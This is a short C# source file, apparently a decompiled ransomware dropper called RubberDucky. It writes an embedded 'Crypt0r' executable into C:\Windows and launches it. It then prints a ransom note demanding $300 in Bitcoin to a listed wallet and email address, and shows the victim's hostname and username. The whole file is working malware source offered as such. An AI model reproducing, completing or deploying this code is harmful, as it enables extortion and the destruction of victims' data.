using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace RubberDucky;

internal class Program
{
	private static void Main()
	{
		Extract("RubberDucky", "C:\\Windows", "Resources", "RubberDucky_Crypt0r.exe");
		Process.Start("C:\\\\Windows\\\\RubberDucky_Crypt0r.exe");
		string text = "Your data is encrypted with a special encryption software, it is certainly impossible for you to recover your data" + Environment.NewLine + "without a private key, to purchase it, follow the steps, below, without skipping any." + Environment.NewLine + Environment.NewLine + "1. Send $300 worth of Bitcoins to: 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG" + Environment.NewLine + Environment.NewLine + "2. E-mail danielnusradin@gmail.com your BTC transaction ID, as well as your personal installation Key." + Environment.NewLine + Environment.NewLine + "3. Your personal installation Key: HDSUEHDHWIDHjhsjUUU277278282UUKXSKD" + Environment.NewLine + "NOTE: DO NOT CLOSE THE CONSOLE APP!" + Environment.NewLine + Environment.NewLine + "Your operating system: " + Environment.OSVersion.ToString() + Environment.NewLine + "Hostname: " + Dns.GetHostName() + Environment.NewLine + "PC UserName: " + Environment.UserName;
		string text2 = text;
		foreach (char value in text2)
		{
			Console.Write(value);
			Thread.Sleep(30);
		}
		Console.WriteLine();
		Console.ReadLine();
	}

	private static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}
}
